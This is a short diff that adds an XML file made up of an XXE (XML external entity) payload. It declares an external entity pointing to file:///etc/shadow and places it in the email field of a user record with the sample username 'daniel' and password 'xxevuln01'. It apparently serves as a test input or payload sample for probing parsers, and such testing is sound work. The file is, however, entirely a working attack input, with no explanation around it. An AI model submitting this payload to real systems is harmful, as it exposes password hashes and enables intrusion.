@@ -1,0 +1,7 @@
+<!--?xml version="1.0" ?-->
+<!DOCTYPE replace [<!ENTITY xxe SYSTEM "file:///etc/shadow"> ]>
+<user>
+        <email>&xxe;</email>
+        <username>daniel</username>
+        <password>xxevuln01</password>
+</user>
